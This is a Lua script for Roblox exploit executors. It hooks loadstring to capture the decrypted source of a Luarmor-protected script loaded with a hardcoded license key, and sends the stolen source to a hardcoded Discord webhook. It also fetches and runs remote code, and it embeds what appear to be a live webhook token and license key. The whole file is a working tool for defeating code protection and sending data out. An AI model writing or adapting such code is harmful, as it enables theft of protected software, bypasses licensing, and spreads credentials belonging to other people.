--[[
  Capture source → Discord webhook only. Debug messages sent to same webhook.
]]

local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
local _U = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"
local _W = "https://discord.com/api/webhooks/1479359786561835118/h-J6cqgI66Kddz4_PlnmYq92Xn5b6BBXEAByZNzF_sf1HPLgUX4NhVkYzkdAFpbXcz8-"

local _n = 0
local _maxChunk = 3900

local function _escape(s)
	return tostring(s):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")
end

-- Try executor HTTP first (Roblox HttpService often blocks Discord). Content max 2000 chars.
local function _post(content)
	local body = "{\"content\":" .. ("%q"):format(_escape(tostring(content):sub(1, 2000))) .. "}"
	pcall(function()
		if type(request) == "function" then
			request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
			return
		end
		if type(http_request) == "function" then
			http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
			return
		end
		if type(syn and syn.request) == "function" then
			syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
			return
		end
		if game and game.GetService then
			game:GetService("HttpService"):PostAsync(_W, body)
		end
	end)
end

local function _debug(msg)
	_post("[DEBUG] " .. tostring(msg))
end

local function _sendHttp(body, contentType)
	contentType = contentType or "application/json"
	if type(request) == "function" then request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if type(http_request) == "function" then http_request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if type(syn and syn.request) == "function" then syn.request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = body }) return end
	if game and game.GetService then game:GetService("HttpService"):PostAsync(_W, body) end
end

-- Send full source as ONE file attachment (no rate limit). Discord allows up to 25MB per file.
local function _sendAsFile(s)
	local boundary = "----Boundary" .. tostring(math.random(100000, 999999))
	local header = "Content-Disposition: form-data; name=\"content\"\r\n\r\nCaptured source (" .. #s .. " chars) - full file attached.\r\n"
	local filePart = "Content-Disposition: form-data; name=\"file\"; filename=\"source.lua\"\r\nContent-Type: text/plain\r\n\r\n"
	local body = "--" .. boundary .. "\r\n" .. header .. "--" .. boundary .. "\r\n" .. filePart .. s .. "\r\n--" .. boundary .. "--\r\n"
	local ok = pcall(function()
		_sendHttp(body, "multipart/form-data; boundary=" .. boundary)
	end)
	return ok
end

local function _send(s)
	if type(s) ~= "string" or #s < 600 then return end
	_n = _n + 1
	(task and task.defer or spawn or function(f) f() end)(function()
		pcall(function()
			-- 1) Try single webhook with file attachment (all 155 "parts" in one message)
			local sent = _sendAsFile(s)
			if sent then
				_post("[DEBUG] Sent full source as file attachment (" .. #s .. " chars)")
				return
			end
			-- 2) Fallback: save to file if executor has writefile, then one webhook message
			if writefile then
				local path = "static_content_130525/source_captured.lua"
				pcall(function() if makefolder then makefolder("static_content_130525") end end)
				pcall(function() writefile(path, s) end)
				_post("[DEBUG] Saved to " .. path .. " (" .. #s .. " chars) - check executor folder")
				return
			end
			-- 3) Last resort: send only first chunk so you get something
			local chunk = s:sub(1, _maxChunk)
			local body = game and game.GetService and game:GetService("HttpService"):JSONEncode({
				content = ("Full source " .. #s .. " chars - file upload/save failed. First " .. _maxChunk .. " chars below:"),
				embeds = { { description = "```lua\n" .. chunk .. "\n```" } }
			}) or "{\"content\":\"Full source " .. #s .. " chars - check executor folder for writefile\"}"
			_sendHttp(body)
		end)
	end)
end

_debug("Script started")

local _real = loadstring
local _d = debug
local _useHook = _d and _d.sethook and _d.getinfo and _d.getlocal

if _useHook then
	_debug("Using debug hook (will remove after first loadstring so it doesn't freeze)")
	-- Only hook for the FIRST loadstring call (the loader). Then remove hook and use wrapper so we don't freeze.
	local _hookActive = true
	_d.sethook(function(ev)
		if ev ~= "call" or not _hookActive then return end
		local info = _d.getinfo(2, "f")
		if not info or not info.func then return end
		if info.func ~= _real then return end
		local _, src = _d.getlocal(2, 1)
		_debug("loadstring called, len=" .. (type(src) == "string" and #src or 0) .. " – removing hook, using wrapper")
		_hookActive = false
		_d.sethook()
		-- From now on use wrapper so next loadstring (decrypted) gets captured
		loadstring = function(src2, name)
			if type(src2) == "string" then _send(src2) end
			return _real(src2, name)
		end
	end, "c")
else
	_debug("Using loadstring wrapper (debug.sethook not available)")
	loadstring = function(src, name)
		if type(src) == "string" then _send(src) end
		return _real(src, name)
	end
end

_debug("Calling loader: GetHttp + loadstring...")
local ok, err = pcall(function()
	script_key = _K
	loadstring(game:HttpGet(_U))()
end)
if not ok then
	_debug("ERROR: " .. tostring(err))
end
